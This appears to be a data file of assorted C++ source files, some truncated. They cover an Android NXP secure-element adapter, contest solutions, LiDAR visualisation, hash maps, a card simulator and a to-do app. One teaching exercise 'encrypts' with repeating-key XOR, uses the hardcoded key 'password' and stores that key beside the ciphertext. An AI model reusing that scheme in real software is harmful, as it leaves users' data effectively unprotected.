android::hardware::Void;\nusing android::hardware::secure_element::V1_0::ISecureElement;\nusing android::hardware::secure_element::V1_0::ISecureElementHalCallback;\nusing android::hardware::hidl_vec;\nusing android::sp;\n\nusing vendor::nxp::nxpese::V1_0::INxpEse;\n\nextern bool nfc_debug_enabled;\n\nextern \"C\" void GKI_shutdown();\nextern void resetConfig();\nextern \"C\" void verify_stack_non_volatile_store();\nextern \"C\" void delete_stack_non_volatile_store(bool forceDelete);\n\nEseAdaptation* EseAdaptation::mpInstance = NULL;\nThreadMutex EseAdaptation::sLock;\nThreadMutex EseAdaptation::sIoctlLock;\nsp<INxpEse> EseAdaptation::mHalNxpEse;\nsp<ISecureElement> EseAdaptation::mHal;\ntHAL_ESE_CBACK* EseAdaptation::mHalCallback = NULL;\ntHAL_ESE_DATA_CBACK* EseAdaptation::mHalDataCallback = NULL;\nThreadCondVar EseAdaptation::mHalOpenCompletedEvent;\nThreadCondVar EseAdaptation::mHalCloseCompletedEvent;\n\n#if (NXP_EXTNS == TRUE)\nThreadCondVar EseAdaptation::mHalCoreResetCompletedEvent;\nThreadCondVar EseAdaptation::mHalCoreInitCompletedEvent;\nThreadCondVar EseAdaptation::mHalInitCompletedEvent;\n#define SIGNAL_NONE 0\n#define SIGNAL_SIGNALED 1\nstatic uint8_t isSignaled = SIGNAL_NONE;\nstatic uint8_t evt_status;\n#endif\n\n/*******************************************************************************\n**\n** Function:    EseAdaptation::EseAdaptation()\n**\n** Description: class constructor\n**\n** Returns:     none\n**\n*******************************************************************************/\nEseAdaptation::EseAdaptation() {\n  mCurrentIoctlData = NULL;\n  memset(&mSpiHalEntryFuncs, 0, sizeof(mSpiHalEntryFuncs));\n}\n\n/*******************************************************************************\n**\n** Function:    EseAdaptation::~EseAdaptation()\n**\n** Description: class destructor\n**\n** Returns:     none\n**\n*******************************************************************************/\nEseAdaptation::~EseAdaptation() { mpInstance = NULL; }\n\n/*******************************************************************************\n**\n** Function:    EseAdaptation::GetInstance()\n**\n** Description: access class singleton\n**\n** Returns:     pointer to the singleton object\n**\n*******************************************************************************/\nEseAdaptation& EseAdaptation::GetInstance() {\n  AutoThreadMutex a(sLock);\n\n  if (!mpInstance) mpInstance = new EseAdaptation;\n  return *mpInstance;\n}\n\n/*******************************************************************************\n**\n** Function:    EseAdaptation::Initialize()\n**\n** Description: class initializer\n**\n** Returns:     none\n**\n*******************************************************************************/\nvoid EseAdaptation::Initialize() {\n  const char* func = \"EseAdaptation::Initialize\";\n  uint8_t cmd_ese_nxp[] = {0x2F, 0x01, 0x01, 0x01};\n  ALOGD_IF(nfc_debug_enabled, \"%s: enter\", func);\n\n  mHalCallback = NULL;\n  ese_nxp_IoctlInOutData_t* pInpOutData;\n  pInpOutData =\n      (ese_nxp_IoctlInOutData_t*)malloc(sizeof(ese_nxp_IoctlInOutData_t));\n  if (!pInpOutData) {\n    ALOGE(\"%s Unable to initialize as memory allocation failed\", __func__);\n    return;\n  }\n  memset(pInpOutData, 0x00, sizeof(ese_nxp_IoctlInOutData_t));\n  pInpOutData->inp.data.nxpCmd.cmd_len = sizeof(cmd_ese_nxp);\n  memcpy(pInpOutData->inp.data.nxpCmd.p_cmd, cmd_ese_nxp, sizeof(cmd_ese_nxp));\n  InitializeHalDeviceContext();\n  if (pInpOutData != NULL) free(pInpOutData);\n  ALOGD_IF(nfc_debug_enabled, \"%s: exit\", func);\n}\n\n/*******************************************************************************\n**\n** Function:    EseAdaptation::signal()\n**\n** Description: signal the CondVar to release the thread that is waiting\n**\n** Returns:     none\n**\n*******************************************************************************/\nvoid EseAdaptation::signal() { mCondVar.signal(); }\n\n/*******************************",
    "#include <cmath>\n#include <cstdio>\n#include <vector>\n#include <iostream>\n#include <algorithm>\n#include<bits/stdc++.h>\n#define K 1000000007ll\n#define L 200001\nstatic int parents[L];\nstatic long long children[L];\nbool  valuesSet[200001];\nstatic long long valuesSum;\nusing namespace std;\n\nint main() {\n    int n, q, a, b, k;\n    int i, j;\n    long long sum;\n    cin >> n >> q;\n\n    for (i = 0; i < n - 1; ++i) {\n        cin >> a >> b;\n\n        if (a < b) {\n            parents[b] = a;\n        } else {\n            parents[a] = b;\n        }\n    }\n\n    parents[1] = 0;\n\n    for (i = 0; i < q; ++i) {\n        cin >> k;\n        for (j = 0; j <=n; ++j)\n        valuesSet[j]=false;\n        memset(children, 0, sizeof(long long) * n);\n        valuesSum = 0;\n\n        for (j = 0; j < k; ++j) {\n            cin >> a;\n            valuesSum += a;\n            // cout<<\"valueSum= \"<<valuesSum<<endl;\n            valuesSet[a] = true;\n        }\n        sum = 0;\n        for (j = n; j > 0; j--) {\n            // cout<<\" j = \"<<j<<endl;\n            long long a = children[j];\n            // cout<<\" childen[j] = \"<<children[j]<<endl;\n            if (valuesSet[j]) {\n                a += j;\n                // cout<<\"a = \"<<a<<endl;\n            }\n\n            if (a) {\n                long long x = ( (a % K) * ((valuesSum - a) % K) ) % K;\n                sum =(sum+ x)%K;\n                // cout<<\"sum = \"<<sum<<endl;\n            }\n\n            children[parents[j]] += a;\n            // cout<<\"children[parents[j]]= \"<<children[parents[j]]<<endl;\n        }\n\n        cout << sum << endl;\n    }\n    return 0;\n}  \n",
    "\n#include <iostream>\n#include <algorithm>\n#include <opencv2/highgui/highgui.hpp>\n#include <opencv2/imgproc/imgproc.hpp>\n#include \"lidarData.hpp\"\n\n\nusing namespace std;\n\n// remove Lidar points based on min. and max distance in X, Y and Z\nvoid cropLidarPoints(std::vector<LidarPoint> &lidarPoints, float minX, float maxX, float maxY, float minZ, float maxZ, float minR)\n{\n    std::vector<LidarPoint> newLidarPts; \n    for(auto it=lidarPoints.begin(); it!=lidarPoints.end(); ++it) {\n        \n       if( (*it).x>=minX && (*it).x<=maxX && (*it).z>=minZ && (*it).z<=maxZ && (*it).z<=0.0 && abs((*it).y)<=maxY && (*it).r>=minR )  // Check if Lidar point is outside of boundaries\n       {\n           newLidarPts.push_back(*it);\n       }\n    }\n\n    lidarPoints = newLidarPts;\n}\n\n\n\n// Load Lidar points from a given location and store them in a vector\nvoid loadLidarFromFile(vector<LidarPoint> &lidarPoints, string filename)\n{\n    // allocate 4 MB buffer (only ~130*4*4 KB are needed)\n    unsigned long num = 1000000;\n    float *data = (float*)malloc(num*sizeof(float));\n    \n    // pointers\n    float *px = data+0;\n    float *py = data+1;\n    float *pz = data+2;\n    float *pr = data+3;\n    \n    // load point cloud\n    FILE *stream;\n    stream = fopen (filename.c_str(),\"rb\");\n    num = fread(data,sizeof(float),num,stream)/4;\n \n    for (int32_t i=0; i<num; i++) {\n        LidarPoint lpt;\n        lpt.x = *px; lpt.y = *py; lpt.z = *pz; lpt.r = *pr;\n        lidarPoints.push_back(lpt);\n        px+=4; py+=4; pz+=4; pr+=4;\n    }\n    fclose(stream);\n}\n\n\nvoid showLidarTopview(std::vector<LidarPoint> &lidarPoints, cv::Size worldSize, cv::Size imageSize, bool bWait)\n{\n    // create topview image\n    cv::Mat topviewImg(imageSize, CV_8UC3, cv::Scalar(0, 0, 0));\n\n    // plot Lidar points into image\n    for (auto it = lidarPoints.begin(); it != lidarPoints.end(); ++it)\n    {\n        float xw = (*it).x; // world position in m with x facing forward from sensor\n        float yw = (*it).y; // world position in m with y facing left from sensor\n\n        int y = (-xw * imageSize.height / worldSize.height) + imageSize.height;\n        int x = (-yw * imageSize.height / worldSize.height) + imageSize.width / 2;\n\n        cv::circle(topviewImg, cv::Point(x, y), 5, cv::Scalar(0, 0, 255), -1);\n    }\n\n    // plot distance markers\n    float lineSpacing = 2.0; // gap between distance markers\n    int nMarkers = floor(worldSize.height / lineSpacing);\n    for (size_t i = 0; i < nMarkers; ++i)\n    {\n        int y = (-(i * lineSpacing) * imageSize.height / worldSize.height) + imageSize.height;\n        cv::line(topviewImg, cv::Point(0, y), cv::Point(imageSize.width, y), cv::Scalar(255, 0, 0));\n    }\n\n    // display image\n    string windowName = \"Top-View Perspective of LiDAR data\";\n    cv::namedWindow(windowName, 2);\n    cv::imshow(windowName, topviewImg);\n    if(bWait)\n    {\n        cv::waitKey(0); // wait for key to be pressed\n    }\n}\n\nvoid showLidarImgOverlay(cv::Mat &img, std::vector<LidarPoint> &lidarPoints, cv::Mat &P_rect_xx, cv::Mat &R_rect_xx, cv::Mat &RT, cv::Mat *extVisImg)\n{\n    // init image for visualization\n    cv::Mat visImg; \n    if(extVisImg==nullptr)\n    {\n        visImg = img.clone();\n    } else \n    {\n        visImg = *extVisImg;\n    }\n\n    cv::Mat overlay = visImg.clone();\n\n    // find max. x-value\n    double maxVal = 0.0; \n    for(auto it=lidarPoints.begin(); it!=lidarPoints.end(); ++it)\n    {\n        maxVal = maxVal<it->x ? it->x : maxVal;\n    }\n\n    cv::Mat X(4,1,cv::DataType<double>::type);\n    cv::Mat Y(3,1,cv::DataType<double>::type);\n    for(auto it=lidarPoints.begin(); it!=lidarPoints.end(); ++it) {\n\n            X.at<double>(0, 0) = it->x;\n            X.at<double>(1, 0) = it->y;\n            X.at<double>(2, 0) = it->z;\n            X.at<double>(3, 0) = 1;\n\n            Y = P_rect_xx * R_rect_xx * RT * X;\n            cv::Point pt;\n\n            pt.x = Y.at<double>(0, 0) / Y.at<double>(2, 0); \n            pt.y = Y.at<double>(1, 0) / Y.at<double>(2, 0); \n\n            float val = it->x;\n            int red = min(255, (int)(255 * abs((val - maxVal) / maxVal)));\n            int green = min(255, (int)(255 * (1 - abs((val - maxVal) / maxVal))));\n            cv::circle(overlay, pt, 5, cv::Scalar(0, green, red), -1);\n    }\n\n    float opacity = 0.6;\n    cv::addWeighted(overlay, opacity, visImg, 1 - opacity, 0, visImg);\n\n    // return augmented image or wait if no image has been provided\n    if (extVisImg == nullptr)\n    {\n        string windowName = \"LiDAR data on image overlay\";\n        cv::namedWindow( windowName, 3 );\n        cv::imshow( windowName, visImg );\n        cv::waitKey(0); // wait for key to be pressed\n    }\n    else\n    {\n        extVisImg = &visImg;\n    }\n}\n",
    "#include <cassert>\r\n#include <cstddef>\r\n#include <fstream>\r\n#include <iomanip>\r\n#include <iostream>\r\n#include <sstream>\r\n#include <ctime>\r\n\r\n// Function to perform XOR encryption/decryption\r\nstd::string encrypt_decrypt(const std::string& source, const std::string& key)\r\n{\r\n    const auto key_length = key.length();\r\n    const auto source_length = source.length();\r\n\r\n    assert(key_length > 0);\r\n    assert(source_length > 0);\r\n\r\n    std::string output = source;\r\n\r\n    // Perform XOR encryption/decryption\r\n    for (size_t i = 0; i < source_length; ++i)\r\n    {\r\n        output[i] = source[i] ^ key[i % key_length];\r\n    }\r\n\r\n    assert(output.length() == source_length);\r\n    return output;\r\n}\r\n\r\n// Function to read the contents of a file into a string\r\nstd::string read_file(const std::string& filename)\r\n{\r\n    std::ifstream file(filename);\r\n    std::ostringstream content;\r\n\r\n    if (file)\r\n    {\r\n        content << file.rdbuf();\r\n    }\r\n    else\r\n    {\r\n        std::cerr << \"Could not open file \" << filename << std::endl;\r\n        return \"\";\r\n    }\r\n\r\n    return content.str();\r\n}\r\n\r\n// Function to extract the student's name from the file content\r\nstd::string get_student_name(const std::string& string_data)\r\n{\r\n    size_t pos = string_data.find('\\n');\r\n    if (pos != std::string::npos)\r\n    {\r\n        return string_data.substr(0, pos);\r\n    }\r\n    return \"\";\r\n}\r\n\r\n// Function to save data to a file in a specified format\r\nvoid save_data_file(const std::string& filename, const std::string& student_name, const std::string& key, const std::string& data)\r\n{\r\n    std::ofstream file(filename);\r\n    if (file)\r\n    {\r\n        // Get current date\r\n        std::time_t t = std::time(nullptr);\r\n        std::tm* now = std::localtime(&t);\r\n        file << student_name << '\\n';\r\n        file << (now->tm_year + 1900) << '-' \r\n             << (now->tm_mon + 1) << '-' \r\n             << now->tm_mday << '\\n';\r\n        file << key << '\\n';\r\n        file << data;\r\n    }\r\n    else\r\n    {\r\n        std::cerr << \"Could not open file \" << filename << std::endl;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    std::cout << \"Encryption Decryption Test!\" << std::endl;\r\n\r\n    const std::string file_name = \"inputdatafile.txt\";\r\n    const std::string encrypted_file_name = \"encrypteddatafile.txt\";\r\n    const std::string decrypted_file_name = \"decrypteddatafile.txt\";\r\n    const std::string source_string = read_file(file_name);\r\n    const std::string key = \"password\";\r\n\r\n    if (source_string.empty())\r\n    {\r\n        std::cerr << \"No data read from file: \" << file_name << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    const std::string student_name = get_student_name(source_string);\r\n\r\n    const std::string encrypted_string = encrypt_decrypt(source_string, key);\r\n    save_data_file(encrypted_file_name, student_name, key, encrypted_string);\r\n\r\n    const std::string decrypted_string = encrypt_decrypt(encrypted_string, key);\r\n    save_data_file(decrypted_file_name, student_name, key, decrypted_string);\r\n\r\n    std::cout << \"Read File: \" << file_name << \" - Encrypted To: \" << encrypted_file_name << \" - Decrypted To: \" << decrypted_file_name << std::endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"chandsimit.h\"\n#include <QRandomGenerator>\n\nCHandsImit::CHandsImit(QObject *parent) : QObject(parent)\n{\n    ImitClearList();\n}\n\nint CHandsImit::AddCard(QString sCardName, int nSelectNum)\n{\n    if (m_ltCard.size() > 10)   return 1;\n    for(SelectCard tCard : m_ltCard)\n    {\n        if (!sCardName.compare(tCard.sChardName))    return 2;\n    }\n\n    SelectCard tCard;\n    tCard.sChardName = sCardName;\n    tCard.nDropNum = nSelectNum;\n    m_ltCard.append(tCard);\n    return 0;\n}\n\nint CHandsImit::AddCombo(QStringList ltCardNames)\n{\n    if (m_ltCombo.size() > 10)  return 1;\n    int nCheck = 0;\n\n    for (QString Str : ltCardNames)\n    {\n        QByteArray ba = Str.toUtf8();\n        for(char c : ba)    nCheck += c;\n    }\n    for (SelectComo tCombo : m_ltCombo)\n    {\n        if (tCombo.nCheck == nCheck) return 2;\n    }\n\n    SelectComo tCombo;\n    tCombo.fRate = 0;\n    tCombo.nCout = 0;\n    tCombo.ltCard = ltCardNames;\n    tCombo.nCheck = nCheck;\n    m_ltCombo.append(tCombo);\n    return 0;\n}\n\nvoid CHandsImit::CaculateRate(int nHand, int nDeck)\n{\n    QStringList ltDeck;\n    int nErrorCode = AddCard(&ltDeck);\n    for (int i = ltDeck.size(); i < nDeck; i++)\n    {\n        ltDeck.append(\"NULL\");\n    }\n    for (int i = 0; i < m_ltCombo.size(); i++)\n    {\n        m_ltCombo[i].nCout = 0;\n    }\n    for(int i = 0; i < TRY_TIMES; i++)\n    {\n        QStringList ltDeckCopy = ltDeck;\n        QStringList ltHand;\n        for(int i = 0; i < nHand; i++)\n        {\n            int nRan = QRandomGenerator::global()->bounded(ltDeckCopy.size());\n            QString sDraw;\n            sDraw= ltDeckCopy.takeAt(nRan);\n            if(QString(\"NULL\").compare(sDraw))    ltHand.append(sDraw);\n        }\n        for(SelectComo &tCombo : m_ltCombo)\n        {\n            ScanOneCombo(ltHand, &tCombo);\n        }\n    }\n    for (int i = 0; i < m_ltCombo.size(); i++)\n    {\n        m_ltCombo[i].fRate = (float)m_ltCombo[i].nCout / (TRY_TIMES / 100);\n    }\n    emit signalReflashTabel();\n    return;\n}\n\nint CHandsImit::AddCard(QStringList *pDeck)\n{\n    if(m_ltCard.size() == 0 || m_ltCombo.size() == 0)   return 1;\n\n    for (SelectCard Card : m_ltCard)\n    {\n        for(int i = 0; i < Card.nDropNum; i++)\n        {\n            pDeck->append(Card.sChardName);\n        }\n    }\n\n    return 0;\n}\n\nbool CHandsImit::ScanOneCombo(QStringList &ltHand, CHandsImit::SelectComo *pCombo)\n{\n    int isHas = 0;\n    for (int i = 0; i < pCombo->ltCard.size(); i++)\n    {\n        if (ltHand.contains(pCombo->ltCard[i])) isHas++;\n    }\n    if (isHas == pCombo->ltCard.size())\n    {\n        pCombo->nCout++;\n        return true;\n    }\n    else    return false;\n}\n\n\n\n",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nint vet[100];\nbool check[100];\n\nint main() {\n    \n    int t;\n    cin>>t;\n    \n    while (t--) {\n        \n        string s;\n        cin>>s;\n        \n        for (int i=0; i<(int)s.size(); i++) vet[i]=-1;\n        for (int i=0; i<(int)s.size(); i++) check[i]=false;\n        \n        //0 eh verde, 1 eh vermelho\n        \n        for (int i=0; i<(int)s.size(); i++) {\n            \n            if (check[i]==false) {\n                \n                vet[i]=0;\n                check[i]=true;\n                int cont = 0;\n                \n                for (int j=i+1; j<(int)s.size(); j++) {\n                    \n                    if (s[j]==s[i]){\n                        \n                        check[j]=true;\n                    \n                    if (cont == 0) {\n                        \n                        cont = 1;\n                        vet[j]=1;\n                        \n                    }\n                    \n                    }\n                    \n                }\n                \n            }\n            \n        }\n        \n        int ans = 0;\n        \n        for (int i=0; i<(int)s.size(); i++) {\n            \n            if (vet[i]==0 || vet[i]==1) ans++;\n            \n        }\n        \n        printf (\"%d\\n\", ans/2);\n        \n    }\n    \n    return 0;\n    \n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <iostream>\r\n#include <vector>\r\n#include <list>\r\n#include <utility>\r\n\r\nusing namespace std;\r\nclass HashMapLinearProbing {\r\nprivate:\r\n    vector<pair<int, int>> table;\r\n    vector<bool> occupied;\r\n    int capacity;\r\n    int size;\r\n\r\n    int hash(int key) {\r\n        return key % capacity;\r\n    }\r\n\r\npublic:\r\n    HashMapLinearProbing(int cap = 101) : capacity(cap), size(0) {\r\n        table.resize(capacity, {-1, -1});\r\n        occupied.resize(capacity, false);\r\n    }\r\n\r\n    bool find(int key) {\r\n        int index = hash(key);\r\n        int originalIndex = index;\r\n        while (occupied[index]) {\r\n            if (table[index].first == key) {\r\n                return true;\r\n            }\r\n            index = (index + 1) % capacity;\r\n            if (index == originalIndex) break;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    void insert(int key, int value) {\r\n        if (size >= capacity) {\r\n            cout << \"HashMap is full\" << endl;\r\n            return;\r\n        }\r\n\r\n        int index = hash(key);\r\n        while (occupied[index]) {\r\n            if (table[index].first == key) {\r\n                table[index].second = value;\r\n                return;\r\n            }\r\n            index = (index + 1) % capacity;\r\n        }\r\n\r\n        table[index] = {key, value};\r\n        occupied[index] = true;\r\n        size++;\r\n    }\r\n\r\n    void remove(int key) {\r\n        int index = hash(key);\r\n        int originalIndex = index;\r\n        while (occupied[index]) {\r\n            if (table[index].first == key) {\r\n                table[index] = {-1, -1};\r\n                occupied[index] = false;\r\n                size--;\r\n                return;\r\n            }\r\n            index = (index + 1) % capacity;\r\n            if (index == originalIndex) break;\r\n        }\r\n    }\r\n\r\n    void print() {\r\n        for (int i = 0; i < capacity; ++i) {\r\n            if (occupied[i]) {\r\n                cout << \"{\" << table[i].first << \", \" << table[i].second << \"} \";\r\n            }\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\nclass HashMapSeparateChaining {\r\nprivate:\r\n    vector<list<pair<int, int>>> table;\r\n    int capacity;\r\n    int size;\r\n\r\n    int hash(int key) {\r\n        return key % capacity;\r\n    }\r\n\r\npublic:\r\n    HashMapSeparateChaining(int cap = 101) : capacity(cap), size(0) {\r\n        table.resize(capacity);\r\n    }\r\n\r\n    bool find(int key) {\r\n        int index = hash(key);\r\n        for (auto &entry : table[index]) {\r\n            if (entry.first == key) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    void insert(int key, int value) {\r\n        int index = hash(key);\r\n        for (auto &entry : table[index]) {\r\n            if (entry.first == key) {\r\n                entry.second = value;\r\n                return;\r\n            }\r\n        }\r\n        table[index].emplace_back(key, value);\r\n        size++;\r\n    }\r\n\r\n    void remove(int key) {\r\n        int index = hash(key);\r\n        for (auto it = table[index].begin(); it != table[index].end(); ++it) {\r\n            if (it->first == key) {\r\n                table[index].erase(it);\r\n                size--;\r\n                return;\r\n            }\r\n        }\r\n    }\r\n\r\n    void print() {\r\n        for (int i = 0; i < capacity; ++i) {\r\n            for (auto &entry : table[i]) {\r\n                cout << \"{\" << entry.first << \", \" << entry.second << \"} \";\r\n            }\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\nint main() {\r\n    HashMapLinearProbing hashMapLP;\r\n    hashMapLP.insert(1, 100);\r\n    hashMapLP.insert(2, 200);\r\n    hashMapLP.insert(3, 300);\r\n    hashMapLP.print();\r\n    cout << hashMapLP.find(2) << endl;\r\n    hashMapLP.remove(2);\r\n    hashMapLP.print();\r\n    cout << hashMapLP.find(2) << endl;\r\n\r\n    cout << \"\\nHashMap with Separate Chaining:\" << endl;\r\n    HashMapSeparateChaining hashMapSC;\r\n    hashMapSC.insert(1, 100);\r\n    hashMapSC.insert(2, 200);\r\n    hashMapSC.insert(3, 300);\r\n    hashMapSC.print();\r\n    cout <<hashMapSC.find(2) << endl;\r\n    hashMapSC.remove(2);\r\n    hashMapSC.print();\r\n    cout <<hashMapSC.find(2) << endl;\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <string>\n#include <limits>\n\nusing namespace std;\n\nclass Todo {\nprivate:\n    static const int array_size = 3;\n    string tasks[array_size];\n    int task_count = 0;\n    int option = -1;\n\npublic:\n    void start();\n    void Display_task();\n    void Add_task();\n    void Delete_task();\n};\n\nvoid Todo::Display_task() {\n    if (task_count == 0) {\n        cout << \"There are no tasks!\" << endl;\n    } else {\n        cout << \"-----------Your tasks: --------------\" << endl;\n        for (int i = 0; i < task_count; i++) {\n            cout << \"Task \" << i + 1 << \" : \" << tasks[i] << endl;\n        }\n    }\n}\n\nvoid Todo::Add_task() {\n    if (task_count >= array_size) {\n        cout << \"The list is full!\" << endl<<endl;\n    } else {\n        cout << \"Enter a new task: \";\n        cin.ignore();\n        getline(cin, tasks[task_count]);\n        task_count++;\n    }\n}\n\nvoid Todo::Delete_task() {\n    int delete_task = 0;\n    cout << \"Input the task number you want to delete: \";\n    cin >> delete_task;\n    if (delete_task <= 0 || delete_task > task_count) {\n        cout << \"Invalid task number!\" << endl;\n    } else {\n        for (int i = delete_task - 1; i < task_count - 1; i++) {\n            tasks[i] = tasks[i + 1];\n        }\n        task_count--;\n        cout << \"Task \" << delete_task << \" has been deleted.\" << endl;\n    }\n}\n\nvoid Todo::start() {\n    do {\n\n        cout << \"---------------Todo list-------------\" << endl;\n        cout << \"1- Add_task\" << endl;\n        cout << \"2- Display_tasks\" << endl;\n        cout << \"3- Delete_task\" << endl;\n        cout << \"0- Exit\" << endl;\n        cout << \"-------------------------------------\" << endl;\n        cout << \"--> \";\n\n        while (!(cin >> option) || option < 0 || option > 3) {\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            cout << \"Invalid input, please enter a valid option (0-3): \";\n        }\n\n        cout << endl << endl;\n\n        switch (option) {\n            case 1:\n                Add_task();\n                break;\n            case 2:\n                Display_task();\n                break;\n            case 3:\n                Delete_task();\n                break;\n            case 0:\n                cout << \"Have a productive day!\" << endl;\n                break;\n            default:\n\n                break;\n        }\n\n    } while (option != 0);\n}\n\nint main() {\n    Todo doit;\n    doit.start();\n    return 0;\n}\n",
